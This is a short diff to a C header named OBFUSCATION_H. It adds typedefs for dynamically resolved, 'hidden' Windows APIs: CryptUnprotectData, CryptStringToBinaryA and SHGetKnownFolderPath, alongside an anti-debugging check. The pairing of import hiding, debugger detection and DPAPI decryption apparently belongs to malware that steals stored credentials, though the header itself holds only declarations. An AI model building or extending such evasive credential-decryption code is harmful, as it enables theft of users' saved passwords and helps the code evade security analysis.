@@ -1,3 +1,7 @@
+#ifndef OBFUSCATION_H
+#define OBFUSCATION_H
+#include <shlobj.h>
+#include <knownfolders.h>
 #include <stddef.h>
 #include <windows.h>
 
@@ -19,11 +23,20 @@
 
 typedef BOOL(WINAPI *PCheckRemoteDebuggerPresent)(HANDLE hProcess, PBOOL pbDebuggerPresent);
 typedef HMODULE(WINAPI *PLoadLibraryA)(LPCSTR lpLibFileName);
-//typedef HRESULT(WINAPI *PSHGetKnownFolderPath)(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken, PWSTR *ppszPath);
+typedef BOOL(WINAPI *PCryptUnprotectData)(DATA_BLOB*, LPWSTR*, DATA_BLOB*, void*, void*, DWORD, DATA_BLOB*);
+typedef BOOL(WINAPI *PCryptStringToBinaryA)(LPCSTR, DWORD, DWORD, BYTE*, DWORD*, DWORD*, DWORD*);
+typedef HRESULT(WINAPI *PSHGetKnownFolderPath)(REFKNOWNFOLDERID rfid, DWORD dwFlags, HANDLE hToken, PWSTR *ppszPath);
+
+
 typedef struct {
   PCheckRemoteDebuggerPresent funcCheckRemoteDebuggerPresent;
   PLoadLibraryA funcLoadLibraryA;
-  //PSHGetKnownFolderPath funcSHGetKnownFolderPath;
+  PCryptUnprotectData funcCryptUnprotectData;
+  PCryptStringToBinaryA funcCryptStringToBinaryA;
+  PSHGetKnownFolderPath funcSHGetKnownFolderPath;
 } hidden_apis;
 
+
 void resolve_apis(hidden_apis *apis);
+
+#endif // OBFUSCATION_H
